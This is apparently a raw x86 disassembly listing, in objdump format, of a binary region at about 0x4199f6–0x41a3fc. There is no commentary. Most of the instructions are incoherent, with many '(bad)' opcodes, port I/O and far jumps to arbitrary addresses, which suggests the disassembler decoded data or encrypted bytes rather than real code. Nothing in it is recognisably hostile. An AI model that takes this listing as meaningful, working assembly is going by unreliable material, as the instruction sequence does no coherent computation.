  4199f6:	les    ecx,FWORD PTR [eax]
  4199f8:	jno    0x419a5a
  4199fa:	pop    esi
  4199fb:	pop    esp
  4199fc:	je     0x419a2e
  4199fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ff:	dec    eax
  419a00:	add    BYTE PTR [edx],0xda
  419a03:	dec    ebp
  419a04:	adc    dh,dh
  419a06:	iret   
  419a07:	or     BYTE PTR [ebx+edx*1],al
  419a0a:	std    
  419a0b:	and    edi,DWORD PTR [ecx+0x8b94b1]
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0xf1c215d3
  419a81:	xor    BYTE PTR [ebp+0x10fd082],0x0
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	jmp    0x52e0ae3d
  419a91:	xor    ecx,DWORD PTR [ebx-0x225d8c6e]
  419a97:	mov    esi,DWORD PTR [edi+0x1b]
  419a9a:	jns    0x419a8c
  419a9c:	into   
  419a9d:	jbe    0x419a74
  419a9f:	test   DWORD PTR [edi-0x5f],esi
  419aa2:	ror    bh,cl
  419aa4:	pop    ebx
  419aa5:	(bad)  
  419aa6:	call   0xab9e6071
  419aab:	out    dx,eax
  419aac:	popa   
  419aad:	das    
  419aae:	adc    BYTE PTR [ebx],0x0
  419ab1:	fild   WORD PTR [edx-0x52]
  419ab4:	sbb    DWORD PTR [eax+0x1aa3f843],eax
  419aba:	jb     0x419ace
  419abc:	pop    eax
  419abd:	pop    ss
  419abe:	bound  ecx,QWORD PTR [esi+ebx*2-0x34bb8054]
  419ac5:	add    eax,0xac393611
  419aca:	(bad)  
  419acb:	repnz push cs
  419acd:	inc    DWORD PTR [esi+edi*1+0x51f3fcd9]
  419ad4:	push   cs
  419ad5:	frstor [edx]
  419ad7:	popa   
  419ad8:	out    0x43,eax
  419ada:	fadd   st,st(4)
  419adc:	bound  edi,QWORD PTR [edi]
  419ade:	clc    
  419adf:	cmp    BYTE PTR [edi],ch
  419ae1:	inc    eax
  419ae2:	or     esp,edi
  419ae4:	loopne 0x419a6b
  419ae6:	dec    edi
  419ae7:	push   ds
  419ae8:	adc    edi,ebp
  419aea:	sbb    al,0xb2
  419aec:	jle    0x419aa2
  419aee:	or     ah,0x96
  419af1:	adc    DWORD PTR [ecx-0x24],ebx
  419af4:	lds    edx,FWORD PTR [eax+0x39]
  419af7:	rcr    esi,1
  419af9:	(bad)  
  419afa:	adc    eax,0x69eff994
  419aff:	jmp    0x3448e652
  419b04:	dec    ebx
  419b05:	out    0x85,al
  419b07:	pop    ebx
  419b08:	cmp    al,0xf7
  419b0a:	call   0xb2b6:0x89c041ce
  419b11:	lahf   
  419b12:	js     0x419b14
  419b14:	dec    edx
  419b15:	adc    BYTE PTR [ebx+0x73],0x12
  419b19:	cmp    DWORD PTR [ecx-0x65],0x1ed9986
  419b20:	add    al,0xfc
  419b22:	in     al,dx
  419b23:	(bad)  
  419b24:	fistp  WORD PTR [ecx+0x618f1434]
  419b2a:	out    dx,al
  419b2b:	sub    al,0x35
  419b2d:	push   0xb88986dd
  419b32:	cld    
  419b33:	push   0x9731f48
  419b38:	iret   
  419b39:	cmc    
  419b3a:	adc    eax,0x3e9828f8
  419b3f:	cli    
  419b40:	mov    edx,0xfadc3b45
  419b45:	adc    BYTE PTR [ecx-0x5e],0xe5
  419b49:	push   edi
  419b4a:	and    cl,ch
  419b4c:	and    eax,DWORD PTR [ebp+0x23d3781b]
  419b52:	call   0xed41060
  419b57:	imul   edi,DWORD PTR gs:[esi+0x1],0x10c5169b
  419b5f:	mov    dl,0x8e
  419b61:	ins    DWORD PTR es:[edi],dx
  419b62:	mov    ebx,0x77482069
  419b67:	pop    edi
  419b68:	push   esp
  419b69:	mov    ah,0xb8
  419b6b:	pop    ebx
  419b6c:	leave  
  419b6d:	xchg   ebx,eax
  419b6e:	sbb    ah,ch
  419b70:	dec    ecx
  419b71:	out    dx,eax
  419b72:	add    DWORD PTR [esp+ebx*8+0x55],ebx
  419b76:	xchg   ebx,eax
  419b77:	lods   eax,DWORD PTR ds:[esi]
  419b78:	es out dx,eax
  419b7a:	add    ebp,DWORD PTR [ecx+0x62f1194b]
  419b80:	jmp    0x419b79
  419b82:	sub    al,0xac
  419b84:	or     ah,ch
  419b86:	retf   
  419b87:	jg     0x419be4
  419b89:	mov    dh,0xb8
  419b8b:	(bad)  
  419b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b8d:	adc    esi,eax
  419b8f:	dec    esi
	...
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x7b
  419c01:	jmp    0x419b9e
  419c03:	xlat   BYTE PTR ds:[ebx]
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	in     al,0x0
  419c0e:	data16 sti 
  419c10:	pop    esp
  419c11:	inc    esp
  419c12:	xor    BYTE PTR [edi+0x26],bl
  419c15:	test   BYTE PTR [ebx],dl
  419c17:	ret    
  419c18:	pop    ebp
  419c19:	popf   
  419c1a:	jae    0x419bc3
  419c1c:	out    dx,eax
  419c1d:	aaa    
  419c1e:	add    al,0x6b
  419c20:	ss mov ch,0x65
  419c23:	push   DWORD PTR [ebx+ecx*2]
  419c26:	ret    0xb600
  419c29:	xchg   ebp,eax
  419c2a:	cmc    
  419c2b:	mov    edi,0x41317445
  419c30:	jge    0x419c29
  419c32:	test   BYTE PTR [edi-0x3b1b87e1],bl
  419c38:	jns    0x419c7f
  419c3a:	jae    0x419c17
  419c3c:	mov    ch,cl
  419c3e:	pusha  
  419c3f:	fwait
  419c40:	or     eax,0xd57c4be
  419c45:	mov    dl,0xcc
  419c47:	dec    edx
  419c48:	shl    BYTE PTR [esi-0x5f2aa381],cl
  419c4e:	dec    esp
  419c4f:	sahf   
  419c50:	fisttp DWORD PTR [ecx]
  419c52:	into   
  419c53:	ret    0x43f4
  419c56:	aaa    
  419c57:	push   ecx
  419c58:	aas    
  419c59:	adc    al,0xa4
  419c5b:	mov    eax,ds:0x4a9590b8
  419c60:	pop    ebp
  419c61:	sar    bl,cl
  419c63:	cmp    eax,eax
  419c65:	into   
  419c66:	(bad)  
  419c67:	and    eax,ecx
  419c69:	add    DWORD PTR [ebx],eax
  419c6b:	leave  
  419c6c:	or     BYTE PTR [edx+0x53],dl
  419c6f:	cmp    eax,0x72f8d309
  419c74:	jno    0x419c3a
  419c76:	push   ebp
  419c77:	stos   DWORD PTR es:[edi],eax
  419c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c79:	or     esi,DWORD PTR [ebx+eiz*4+0x11ed9fd2]
  419c80:	ins    DWORD PTR es:[edi],dx
  419c81:	(bad)  
  419c82:	lock or al,BYTE PTR [ebx+0x7d]
  419c86:	pop    esi
  419c87:	mov    al,ds:0xe2b7e4f
  419c8c:	push   0x3eedb54f
  419c91:	mov    esi,0xbf7c746d
  419c96:	rcl    DWORD PTR [edi+0x48],1
  419c99:	pop    es
  419c9a:	outs   dx,BYTE PTR ds:[esi]
  419c9b:	inc    eax
  419c9c:	test   al,0x27
  419c9e:	hlt    
  419c9f:	inc    esp
  419ca0:	in     eax,dx
  419ca1:	test   eax,0xeac2b8eb
  419ca6:	ins    BYTE PTR es:[edi],dx
  419ca7:	rcl    DWORD PTR [ebx+ebp*2+0x2b],1
  419cab:	xchg   esi,eax
  419cad:	in     eax,dx
  419cae:	mov    eax,0x65328664
  419cb3:	sahf   
  419cb4:	or     ch,ah
  419cb6:	and    al,0x99
  419cb8:	pop    ebp
  419cb9:	xchg   esi,eax
  419cba:	adc    eax,0x7992a9c2
  419cbf:	dec    edx
  419cc0:	rcr    DWORD PTR [eax-0x68],1
  419cc3:	loope  0x419cf2
  419cc5:	jns    0x419d3f
  419cc7:	sub    al,0x82
  419cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cca:	(bad)  
  419ccb:	rcr    DWORD PTR [eax+0x15f0644a],1
  419cd1:	sbb    BYTE PTR [edx+esi*8-0x7902936c],0x13
  419cd9:	jle    0x419d01
  419cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cdc:	mov    ds:0xa276f98b,eax
  419ce1:	ret    
  419ce2:	pop    eax
  419ce3:	imul   edx,DWORD PTR [ecx-0x44],0xde8834d1
  419cea:	push   edi
  419ceb:	jmp    FWORD PTR [esp+ebp*4+0x63]
  419cef:	lds    eax,FWORD PTR [eax-0x1248a4d4]
  419cf5:	add    eax,0x1068d842
  419cfa:	shr    DWORD PTR [ecx+0x28],cl
  419cfd:	repz push ss
  419cff:	je     0x419d68
  419d01:	int    0x67
  419d03:	sar    DWORD PTR [esi-0xc],0x97
  419d07:	dec    edx
  419d08:	jl     0x419d16
  419d0a:	ret    0x2aee
  419d0d:	sub    dh,BYTE PTR [esi]
  419d0f:	xor    BYTE PTR [eax],al
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisubr DWORD PTR ss:[eax+eiz*4-0x33]
  419d83:	dec    esp
  419d84:	fcom   DWORD PTR [ecx]
  419d86:	add    DWORD PTR [eax],eax
  419d88:	add    al,0x1
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	mov    ds:0xc04c060a,al
  419d91:	pop    esi
  419d92:	sub    bl,BYTE PTR [edx-0x554ad869]
  419d98:	ins    BYTE PTR es:[edi],dx
  419d99:	mov    ds:0x84de8d34,al
  419d9e:	sbb    dl,BYTE PTR [di]
  419da1:	out    dx,al
  419da2:	rcr    DWORD PTR [ecx-0x43],1
  419da5:	push   ds
  419da6:	mov    ebx,0x792d0348
  419dab:	loopne 0x419d75
  419dad:	jmp    0x47be:0x72f07d42
  419db4:	rcl    DWORD PTR [eax+0x8e1f0e],0x19
  419dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dbc:	lods   al,BYTE PTR ds:[esi]
  419dbd:	fist   DWORD PTR [edi+0x292e14ea]
  419dc3:	cmp    al,0xe4
  419dc5:	jle    0x419e29
  419dc7:	mov    al,0x17
  419dc9:	mov    eax,ds:0xe2dd5261
  419dce:	mov    ah,0xbe
  419dd0:	jns    0x419de8
  419dd2:	call   0x461bf118
  419dd7:	cwde   
  419dd8:	mov    edx,0xe87e9b89
  419ddd:	(bad)
  419de2:	retf   0xa5e7
  419de5:	or     al,0xd4
  419de7:	sbb    esi,ecx
  419de9:	mov    ds:0x36437937,al
  419dee:	sub    esi,DWORD PTR [edi-0x61]
  419df1:	fdiv   DWORD PTR [edi]
  419df3:	ds dec ebp
  419df5:	shl    BYTE PTR [ebx],cl
  419df7:	mov    edi,0x88909824
  419dfc:	int3   
  419dfd:	gs push ecx
  419dff:	or     eax,0x36c7e74e
  419e04:	enter  0x708d,0xb3
  419e08:	outs   dx,DWORD PTR ds:[esi]
  419e09:	sti    
  419e0a:	scas   al,BYTE PTR es:[edi]
  419e0b:	popf   
  419e0c:	enter  0xec61,0xfa
  419e10:	fwait
  419e11:	loope  0x419e54
  419e13:	mov    dh,0xaf
  419e15:	sub    BYTE PTR [ecx-0x79],0x68
  419e19:	xchg   esp,eax
  419e1a:	repz test al,0x41
  419e1d:	shl    bl,cl
  419e1f:	or     al,0x7c
  419e21:	mov    al,0x3
  419e23:	and    BYTE PTR [ecx+0x7488cd28],dh
  419e29:	pop    ss
  419e2a:	push   0xffffffd9
  419e2c:	sub    BYTE PTR [ecx],dh
  419e2e:	cmp    ecx,DWORD PTR [edi-0x20]
  419e31:	sbb    eax,0x97eec1c
  419e36:	mov    edi,0x6d4e3f77
  419e3b:	mov    eax,0x67ac0a5d
  419e40:	and    DWORD PTR [ecx+0x18],edx
  419e43:	ins    BYTE PTR es:[edi],dx
  419e44:	jmp    0x419e9d
  419e46:	pop    esi
  419e47:	imul   ebx
  419e49:	aaa    
  419e4a:	pop    ecx
  419e4b:	cld    
  419e4c:	outs   dx,DWORD PTR ds:[esi]
  419e4d:	xor    ah,dh
  419e4f:	ret    
  419e50:	outs   dx,BYTE PTR ds:[esi]
  419e51:	cmp    al,0x49
  419e53:	fmul   st(6),st
  419e55:	fcomip st,st(3)
  419e57:	clc    
  419e58:	cmp    edi,DWORD PTR ds:0x1943e48f
  419e5e:	fldenv [edi-0x36]
  419e61:	xchg   esp,eax
  419e62:	push   esp
  419e63:	mov    cs,WORD PTR [edi-0x1e]
  419e66:	rcr    DWORD PTR [esi-0x19],1
  419e69:	mov    ds:0xfd9b8819,eax
  419e6e:	je     0x419e21
  419e70:	cs xor ebp,edi
  419e73:	loop   0x419e43
  419e75:	je     0x419e0d
  419e77:	xchg   ebx,eax
  419e78:	test   eax,0x480b177e
  419e7d:	(bad)  
  419e7e:	mov    ch,0x47
  419e80:	gs call 0xb353e01b
  419e86:	jo     0x419e8b
  419e88:	rcr    DWORD PTR [esi-0x22],cl
  419e8b:	add    edi,edi
  419e8d:	xchg   BYTE PTR [edi-0x58],bl
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	bound  esi,QWORD PTR [edx]
  419f02:	xchg   BYTE PTR [edx],dh
  419f04:	fcom   QWORD PTR [edx]
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	xlat   BYTE PTR ds:[ebx]
  419f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f0e:	(bad)
  419f12:	lods   al,BYTE PTR ds:[esi]
  419f13:	and    ecx,DWORD PTR [esi]
  419f15:	ret    
  419f16:	sahf   
  419f17:	aam    0x32
  419f19:	dec    esp
  419f1a:	scas   eax,DWORD PTR es:[edi]
  419f1b:	(bad)  
  419f1c:	jl     0x419ed3
  419f1e:	leave  
  419f1f:	add    eax,0x24853098
  419f24:	sbb    BYTE PTR [esi],cl
  419f26:	daa    
  419f27:	loope  0x419eae
  419f29:	stos   DWORD PTR es:[edi],eax
  419f2a:	mov    DWORD PTR [esi+ebx*4-0x2dfd5848],edx
  419f31:	sub    eax,0x6916921b
  419f36:	and    eax,0xa34a6c75
  419f3b:	(bad)  
  419f3c:	cmp    bh,BYTE PTR [si+0x41]
  419f40:	inc    esi
  419f41:	sbb    dl,cl
  419f43:	stos   BYTE PTR es:[edi],al
  419f44:	sub    cl,al
  419f46:	sub    DWORD PTR [edi],esi
  419f48:	inc    esi
  419f49:	int3   
  419f4a:	data16 add BYTE PTR [esi+0x21b1827b],0x5b
  419f52:	inc    eax
  419f53:	pop    edx
  419f54:	pop    es
  419f55:	mov    esi,0xd3617f1
  419f5a:	jb     0x419f39
  419f5c:	sub    DWORD PTR [esi+0x54],ebx
  419f5f:	and    edx,esi
  419f61:	sbb    BYTE PTR [esi+0x2f77ce26],cl
  419f67:	push   ebp
  419f68:	es in  eax,dx
  419f6a:	sahf   
  419f6b:	pop    ss
  419f6c:	xchg   ebp,eax
  419f6d:	ror    DWORD PTR [eax+0x11],1
  419f70:	mov    ch,BYTE PTR [esp+eiz*8]
  419f73:	xor    DWORD PTR [edx],esp
  419f75:	mov    ecx,0x77b904af
  419f7a:	ret    0x61c5
  419f7d:	clc    
  419f7e:	dec    eax
  419f7f:	cmp    eax,0x102ac73c
  419f84:	sti    
  419f85:	mov    eax,0x604ea8fe
  419f8a:	outs   dx,BYTE PTR ds:[esi]
  419f8b:	cli    
  419f8c:	mov    ebx,0xffde3aa7
  419f91:	xchg   esp,eax
  419f92:	sbb    edi,0x628e9e32
  419f98:	je     0x419f7d
  419f9a:	mov    dl,0xea
  419f9c:	outs   dx,DWORD PTR ds:[esi]
  419f9d:	out    0x22,al
  419f9f:	push   ecx
  419fa0:	push   cs
  419fa1:	(bad)  
  419fa2:	sbb    eax,0xc519c5a3
  419fa7:	xchg   edi,eax
  419fa8:	dec    edi
  419fa9:	sub    DWORD PTR [edx+0x6c],edi
  419fac:	das    
  419fad:	clc    
  419fae:	mov    ch,0xee
  419fb0:	dec    ecx
  419fb1:	mov    bh,0xae
  419fb3:	fist   WORD PTR [eax+0x4777b349]
  419fb9:	shl    BYTE PTR [esi+0xb36665c],1
  419fbf:	and    dl,ah
  419fc1:	pushf  
  419fc2:	fcomip st,st(2)
  419fc4:	xor    esp,ecx
  419fc6:	push   ecx
  419fc7:	hlt    
  419fc8:	fcomp  DWORD PTR [ebp-0x7599a8f4]
  419fce:	loop   0x41a024
  419fd0:	sub    eax,0x6a519481
  419fd5:	dec    ecx
  419fd6:	retf   0xb5d4
  419fd9:	je     0x419f9b
  419fdb:	scas   al,BYTE PTR es:[edi]
  419fdc:	jae    0x419fa2
  419fde:	push   es
  419fdf:	mov    esp,0x6653106e
  419fe4:	data16 jae 0x41a02d
  419fe7:	out    dx,eax
  419fe8:	pop    ecx
  419fe9:	push   edi
  419fea:	lahf   
  419feb:	pop    ecx
  419fec:	loope  0x419f75
  419fee:	jmp    0x8beb:0x2536dd61
  419ff5:	and    eax,0xd1c343db
  419ffa:	mov    esp,0x5ba8681a
  419fff:	mov    edx,0x297bcd2d
  41a004:	xor    al,BYTE PTR [eax-0x20]
  41a007:	inc    edx
  41a008:	jbe    0x419f94
  41a00a:	scas   al,BYTE PTR es:[edi]
  41a00b:	jae    0x419fcb
  41a00d:	add    BYTE PTR [eax+0xc1],al
	...
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x5a],bh
  41a081:	lea    edi,[edx-0x17]
  41a084:	loopne 0x41a099
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	jb     0x41a0cc
  41a08e:	mov    esp,0xc427417e
  41a093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a094:	jecxz  0x41a0b5
  41a096:	pop    ecx
  41a097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a098:	adc    al,0xc
  41a09a:	mov    edx,0x4474351a
  41a09f:	mov    bh,BYTE PTR [ebx]
  41a0a1:	xor    esi,0xbf3760a4
  41a0a7:	push   es
  41a0a8:	xlat   BYTE PTR ds:[ebx]
  41a0a9:	fisubr WORD PTR [edi+edx*1]
  41a0ac:	cmp    BYTE PTR [eax+0x711b62f6],al
  41a0b2:	out    dx,eax
  41a0b3:	pop    ecx
  41a0b4:	xchg   ecx,eax
  41a0b5:	fstp   QWORD PTR ds:0xfe511025
  41a0bb:	pop    ds
  41a0bc:	mov    eax,DWORD PTR [esi]
  41a0be:	xor    eax,0x22a59992
  41a0c3:	test   al,0x72
  41a0c5:	jg     0x41a141
  41a0c7:	stos   BYTE PTR es:[edi],al
  41a0c8:	fild   DWORD PTR [ebx+ebx*1-0x50]
  41a0cc:	push   edi
  41a0cd:	ret    0x7c62
  41a0d0:	push   esp
  41a0d1:	in     al,dx
  41a0d2:	and    dh,bh
  41a0d4:	mov    BYTE PTR [ecx],ah
  41a0d6:	adc    ecx,ebp
  41a0d8:	fwait
  41a0d9:	test   eax,0xd5fcc734
  41a0de:	mov    bl,0x4c
  41a0e0:	push   edx
  41a0e2:	or     edx,DWORD PTR [edi+edx*4]
  41a0e5:	rcr    dl,cl
  41a0e7:	push   ds
  41a0e8:	fisubr DWORD PTR [esi-0xd609d96]
  41a0ee:	mov    edi,0x42594ca2
  41a0f3:	xchg   ebp,eax
  41a0f4:	push   edi
  41a0f5:	std    
  41a0f6:	je     0x41a174
  41a0f8:	xor    eax,0x9b65c28f
  41a0fd:	push   esp
  41a0fe:	mov    bl,0x2b
  41a100:	neg    BYTE PTR [edi+ecx*4-0x13]
  41a104:	jmp    0x41a16e
  41a106:	jae    0x41a0f1
  41a108:	xor    ecx,edi
  41a10a:	xchg   esi,eax
  41a10b:	outs   dx,DWORD PTR ds:[esi]
  41a10c:	rcr    edi,1
  41a10e:	xor    edi,ebp
  41a110:	push   ecx
  41a111:	push   esi
  41a112:	fucomip st,st(4)
  41a114:	mov    bl,0x51
  41a116:	dec    esi
  41a117:	(bad)  
  41a118:	cmc    
  41a119:	mov    ds:0x673c8ccf,eax
  41a11e:	xchg   edi,eax
  41a11f:	or     eax,0x7156463a
  41a124:	(bad)  
  41a125:	stc    
  41a126:	shr    al,0x94
  41a129:	mov    ebp,DWORD PTR [ebp+0x433d4c1f]
  41a12f:	data16 cli 
  41a131:	push   ds
  41a132:	dec    edi
  41a133:	loopne 0x41a0ff
  41a135:	imul   ebx,esi,0xfbfa01b6
  41a13b:	push   edi
  41a13c:	leave  
  41a13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a13e:	push   ebp
  41a13f:	daa    
  41a140:	mov    esp,0xce63ee5a
  41a145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a146:	push   es
  41a147:	inc    esp
  41a148:	lods   al,BYTE PTR ds:[esi]
  41a149:	pop    ebx
  41a14a:	dec    dl
  41a14c:	aaa    
  41a14d:	repz add ecx,ebp
  41a150:	lea    ebx,[ebp+0x7b]
  41a153:	push   ss
  41a154:	adc    ebp,DWORD PTR [edx-0x1d]
  41a157:	ins    DWORD PTR es:[edi],dx
  41a158:	pop    ebp
  41a159:	inc    esp
  41a15a:	push   ecx
  41a15b:	jge    0x41a147
  41a15d:	popf   
  41a15e:	lds    esi,FWORD PTR [edi-0x5e]
  41a161:	rol    ebx,cl
  41a163:	cmp    BYTE PTR [ebx],0xe0
  41a166:	mov    al,ds:0x7b350e2f
  41a16b:	std    
  41a16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a16d:	jge    0x41a170
  41a16f:	sub    edx,DWORD PTR [ebx-0x2b74e528]
  41a175:	pop    eax
  41a176:	sbb    dl,BYTE PTR [ebx-0x4e]
  41a179:	in     eax,0xaa
  41a17b:	adc    eax,0xd7adf8
  41a180:	inc    edi
  41a181:	aas    
  41a182:	cmp    eax,0xe63fd3c4
  41a187:	jns    0x41a1f8
  41a189:	outs   dx,BYTE PTR ds:[esi]
  41a18a:	int    0xbc
  41a18c:	(bad)  
  41a18d:	pop    ss
  41a18e:	inc    edi
  41a18f:	mov    esp,0x0
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	test   WORD PTR [edx-0x44],di
  41a204:	in     al,0x14
  41a206:	add    DWORD PTR [eax],eax
  41a208:	add    al,0x1
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	push   es
  41a20d:	icebp  
  41a20e:	xor    al,0xba
  41a210:	clc    
  41a211:	gs push ecx
  41a213:	mov    ah,0x2e
  41a215:	dec    esi
  41a216:	mov    ah,0x84
  41a218:	mov    bl,0xba
  41a21a:	cld    
  41a21b:	or     cl,BYTE PTR [esi+0x5e]
  41a21e:	pop    ebx
  41a21f:	xor    eax,0x8963b074
  41a224:	mov    esp,0xc981a5b5
  41a229:	popa   
  41a22a:	mov    bl,0x7b
  41a22c:	gs xchg esp,eax
  41a22e:	xchg   esi,eax
  41a22f:	push   0xfe398f6e
  41a234:	in     eax,dx
  41a235:	inc    edx
  41a236:	(bad)  [esi+0x2b]
  41a239:	adc    eax,0xa65bd715
  41a23e:	test   DWORD PTR [esi-0x5ad934f9],0x5d43fc92
  41a248:	loop   0x41a24e
  41a24a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a24b:	mov    DWORD PTR [ebp+0x4ce9a987],ebx
  41a251:	sbb    ah,0x98
  41a254:	test   DWORD PTR cs:[ebx+0x13],esp
  41a258:	mov    ecx,0xff6f651f
  41a25d:	or     bh,BYTE PTR [edx+0x14]
  41a260:	push   ebp
  41a261:	in     eax,0x14
  41a263:	jns    0x41a22c
  41a265:	xor    bl,BYTE PTR [edi]
  41a267:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a268:	mov    ebx,0xae12dae2
  41a26d:	ins    BYTE PTR es:[edi],dx
  41a26e:	lahf   
  41a26f:	add    ah,0x4a
  41a272:	dec    esi
  41a273:	jge    0x41a2e9
  41a275:	cdq    
  41a276:	std    
  41a277:	sub    al,ah
  41a279:	js     0x41a2ee
  41a27b:	xor    al,0xe2
  41a27d:	call   0x437d:0x513eb8e0
  41a284:	mov    dh,0x10
  41a286:	inc    ebx
  41a287:	stos   BYTE PTR es:[edi],al
  41a288:	pop    es
  41a289:	jno    0x41a2d4
  41a28b:	iret   
  41a28c:	nop
  41a28d:	and    esp,edi
  41a28f:	ja     0x41a230
  41a291:	mov    ch,bl
  41a293:	aam    0x3e
  41a295:	inc    esi
  41a296:	ret    
  41a297:	jge    0x41a253
  41a299:	pop    DWORD PTR [eax-0x5f]
  41a29c:	mov    ebx,0x14427257
  41a2a1:	shl    BYTE PTR [eax+0x24],0x9d
  41a2a5:	add    eax,eax
  41a2a7:	sub    al,0xab
  41a2a9:	jne    0x41a290
  41a2ab:	mov    bl,0x8f
  41a2ad:	jnp    0x41a240
  41a2af:	cmp    eax,0x9ea0f716
  41a2b4:	dec    edi
  41a2b5:	pop    eax
  41a2b6:	and    al,0x3c
  41a2b8:	pop    esp
  41a2b9:	mov    ecx,0x806e15b2
  41a2be:	cwde   
  41a2bf:	arpl   WORD PTR [ecx-0x1b],cx
  41a2c2:	mov    bh,ah
  41a2c4:	ja     0x41a331
  41a2c6:	cmc    
  41a2c7:	xor    al,0xd3
  41a2c9:	xchg   edx,eax
  41a2ca:	rol    DWORD PTR [esi-0x56ebcffa],0xb
  41a2d1:	cmc    
  41a2d2:	pusha  
  41a2d3:	mov    ds:0x6b50c2b1,al
  41a2d8:	push   edx
  41a2d9:	and    ah,BYTE PTR [esi+0x344cb8ee]
  41a2df:	loopne 0x41a307
  41a2e1:	int3   
  41a2e2:	push   ss
  41a2e3:	fcmovb st,st(1)
  41a2e5:	dec    eax
  41a2e6:	mov    al,ds:0x7bc80361
  41a2eb:	mov    ds:0x46287b91,al
  41a2f0:	xlat   BYTE PTR ds:[ebx]
  41a2f1:	lea    edx,[edx+0x1238f817]
  41a2f7:	in     eax,0x7c
  41a2f9:	jl     0x41a2dd
  41a2fb:	adc    bh,bh
  41a2fd:	mov    ds:0x6e635fe9,al
  41a302:	mov    esi,0xe33ec5f3
  41a307:	push   ss
  41a308:	push   ecx
  41a309:	iret   
  41a30a:	cmp    BYTE PTR [edx],al
  41a30c:	js     0x41a32f
  41a30e:	jp     0x41a315
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	arpl   WORD PTR [ecx+0x15e87a15],sp
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    al,0x1
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	xor    eax,0x56fa5aee
  41a391:	pop    edi
  41a392:	cmp    eax,0x86949a49
  41a397:	rcr    eax,0x3e
  41a39a:	mov    ?,WORD PTR [ebx-0x1]
  41a39d:	imul   esi,DWORD PTR [edi],0x74d12186
  41a3a3:	loope  0x41a34d
  41a3a5:	sub    al,0x30
  41a3a7:	jne    0x41a386
  41a3a9:	fwait
  41a3aa:	pop    ds
  41a3ab:	inc    esp
  41a3ac:	sbb    dl,BYTE PTR ds:0x8abb31c1
  41a3b2:	ss out 0xf,al
  41a3b5:	xchg   BYTE PTR [edi-0x22],bh
  41a3b8:	out    0x9,al
  41a3ba:	out    dx,eax
  41a3bb:	div    BYTE PTR [ebx]
  41a3bd:	lods   al,BYTE PTR ds:[esi]
  41a3be:	loopne 0x41a34c
  41a3c0:	pushf  
  41a3c1:	ss jmp 0x41a3b8
  41a3c4:	jno    0x41a368
  41a3c6:	ss jge 0x41a3c4
  41a3c9:	rol    BYTE PTR [ebx+edx*8],1
  41a3cc:	cwde   
  41a3cd:	push   ds
  41a3ce:	shl    BYTE PTR [ecx+ecx*1+0x5b],1
  41a3d2:	popf   
  41a3d3:	pop    eax
  41a3d4:	inc    ebx
  41a3d5:	(bad)  
  41a3d6:	cmp    ch,BYTE PTR [esi-0x46]
  41a3d9:	inc    esi
  41a3da:	leave  
  41a3db:	jmp    0x7b03:0xc7bbe67f
  41a3e2:	pop    ecx
  41a3e3:	jmp    0x41a455
  41a3e5:	jae    0x41a3f2
  41a3e7:	push   esi
  41a3e8:	stos   DWORD PTR es:[edi],eax
  41a3e9:	cld    
  41a3ea:	in     eax,0x8e
  41a3ec:	sti    
  41a3ed:	daa    
  41a3ee:	or     DWORD PTR [ecx+0x3c],ebx
  41a3f1:	daa    
  41a3f2:	les    edi,FWORD PTR [ebx+0x6f331889]
  41a3f8:	push   si
  41a3fa:	push   esi
  41a3fb:	in     eax,dx
  41a3fc:	ss arpl sp,dx
